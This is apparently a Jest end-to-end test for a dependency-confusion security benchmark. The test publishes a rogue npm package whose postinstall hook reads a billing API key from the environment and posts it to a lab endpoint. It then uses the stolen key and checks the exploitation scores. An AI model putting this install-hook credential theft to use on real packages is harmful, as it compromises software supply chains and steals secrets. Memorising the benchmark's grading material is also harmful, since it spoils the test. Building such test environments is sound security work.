const { execFileSync } = require('child_process')
const fs = require('fs')
const os = require('os')
const path = require('path')
const http = require('http')

const IMAGE = 'benchmark/dependency-confusion-medium'
const CONTAINER_NAME = 'portstone-fullchain-system-test'
const HOST_PORT = 15173
const BASE_URL = `http://localhost:${HOST_PORT}`
const SCORE_TOKEN = 'e2e-fixed-score-token'
const BILLING_KEY = 'e2e-fixed-billing-key'
const CI_SYNC_INTERVAL_MS = 6000

function httpJson(method, urlPath, body) {
  return new Promise((resolve, reject) => {
    const data = body ? JSON.stringify(body) : null
    const req = http.request(
      `${BASE_URL}${urlPath}`,
      {
        method,
        headers: {
          'Content-Type': 'application/json',
          Accept: 'application/json',
          ...(data ? { 'Content-Length': Buffer.byteLength(data) } : {}),
        },
      },
      (res) => {
        let raw = ''
        res.on('data', (c) => (raw += c))
        res.on('end', () => {
          let parsed = null
          try {
            parsed = raw ? JSON.parse(raw) : null
          } catch {
            parsed = raw
          }
          resolve({ status: res.statusCode, body: parsed })
        })
      }
    )
    req.on('error', reject)
    if (data) req.write(data)
    req.end()
  })
}

function httpBearer(urlPath, token) {
  return new Promise((resolve, reject) => {
    const req = http.request(
      `${BASE_URL}${urlPath}`,
      { method: 'GET', headers: { Authorization: `Bearer ${token}` } },
      (res) => {
        let raw = ''
        res.on('data', (c) => (raw += c))
        res.on('end', () => resolve({ status: res.statusCode, body: JSON.parse(raw || '{}') }))
      }
    )
    req.on('error', reject)
    req.end()
  })
}

function sleep(ms) {
  return new Promise((resolve) => setTimeout(resolve, ms))
}

describe('real end-to-end exploit chain against the live container', () => {
  let workDir

  beforeAll(() => {
    execFileSync('docker', ['build', '-t', IMAGE, '.'], { cwd: path.join(__dirname, '..', '..') })
    try {
      execFileSync('docker', ['rm', '-f', CONTAINER_NAME])
    } catch {
      // no prior container, fine
    }
    execFileSync('docker', [
      'run',
      '-d',
      '--name',
      CONTAINER_NAME,
      '-p',
      `${HOST_PORT}:5000`,
      '-e',
      `SCORE_TOKEN=${SCORE_TOKEN}`,
      '-e',
      `INTERNAL_BILLING_API_KEY=${BILLING_KEY}`,
      '-e',
      `CI_SYNC_INTERVAL_MS=${CI_SYNC_INTERVAL_MS}`,
      IMAGE,
    ])

    workDir = fs.mkdtempSync(path.join(os.tmpdir(), 'portstone-e2e-'))
    fs.writeFileSync(
      path.join(workDir, 'package.json'),
      JSON.stringify(
        {
          name: '@portstone/session-utils',
          version: '1.0.3',
          main: 'index.js',
          scripts: { postinstall: 'node payload.js' },
          license: 'UNLICENSED',
        },
        null,
        2
      )
    )
    fs.writeFileSync(
      path.join(workDir, 'index.js'),
      'module.exports = { isSessionFresh: () => true }\n'
    )
    fs.writeFileSync(
      path.join(workDir, 'payload.js'),
      `const http = require('http');
const data = JSON.stringify({ service: 'session-utils-postinstall', value: process.env.INTERNAL_BILLING_API_KEY || '' });
const req = http.request({ hostname: '127.0.0.1', port: 5000, path: '/status/telemetry', method: 'POST', headers: { 'Content-Type': 'application/json', 'Content-Length': Buffer.byteLength(data) } }, () => {});
req.on('error', () => {});
req.write(data);
req.end();
`
    )
  }, 180000)

  afterAll(() => {
    try {
      execFileSync('docker', ['rm', '-f', CONTAINER_NAME])
    } catch {
      // already gone, fine
    }
    if (workDir) fs.rmSync(workDir, { recursive: true, force: true })
  })

  test(
    'npm adduser, a real npm publish, a real postinstall RCE, and the stolen key together score the full exploit chain',
    async () => {
      let ready = false
      for (let i = 0; i < 30 && !ready; i++) {
        try {
          const res = await httpJson('GET', '/status/build-info')
          if (res.status === 200) ready = true
        } catch {
          await sleep(1000)
        }
      }
      expect(ready).toBe(true)

      const buildInfo = await httpJson('GET', '/status/build-info')
      const dep = buildInfo.body.dependencies.find((d) => d.name === '@portstone/session-utils')
      expect(dep.registry).toBe(`${BASE_URL}/registry/`)

      const adduser = await httpJson('PUT', '/registry/-/user/org.couchdb.user/mallory', {
        name: 'mallory',
        password: 'mallory-pw-12345',
        email: 'mallory@test.local',
        type: 'user',
        roles: [],
      })
      expect(adduser.status).toBe(201)
      const token = adduser.body.token

      execFileSync(
        'npm',
        ['config', 'set', `//localhost:${HOST_PORT}/registry/:_authToken=${token}`, '--location=project'],
        { cwd: workDir }
      )
      execFileSync('npm', ['publish', '--registry', `${BASE_URL}/registry/`], { cwd: workDir })

      const metaAfterPublish = await httpJson('GET', '/registry/@portstone%2fsession-utils')
      expect(metaAfterPublish.body['dist-tags'].latest).toBe('1.0.3')

      let stolenKey = null
      for (let i = 0; i < 20 && !stolenKey; i++) {
        await sleep(2000)
        const telemetry = await httpJson('GET', '/status/telemetry')
        const report = telemetry.body.reports.find((r) => r.payload.value === BILLING_KEY)
        if (report) stolenKey = report.payload.value
      }
      expect(stolenKey).toBe(BILLING_KEY)

      const billing = await httpBearer('/internal/billing/summary', stolenKey)
      expect(billing.status).toBe(200)
      expect(billing.body.monthly_recurring_revenue).toBeGreaterThan(0)

      const finalScore = await httpJson('GET', `/score/${SCORE_TOKEN}`)
      expect(finalScore.body.scores.reconnaissance).toBeCloseTo(1.0)
      expect(finalScore.body.scores.vulnerability_detection).toBeCloseTo(3.0)
      expect(finalScore.body.scores.exploitation).toBeCloseTo(4.0)
    },
    120000
  )

  test('reset restores the seeded version and clears scores', async () => {
    await httpJson('POST', `/score/${SCORE_TOKEN}/reset`)

    const meta = await httpJson('GET', '/registry/@portstone%2fsession-utils')
    expect(meta.body['dist-tags'].latest).toBe('1.0.2')

    const score = await httpJson('GET', `/score/${SCORE_TOKEN}`)
    expect(score.body.scores).toEqual({
      exploration: 0,
      reconnaissance: 0,
      vulnerability_detection: 0,
      exploitation: 0,
    })
  })
})
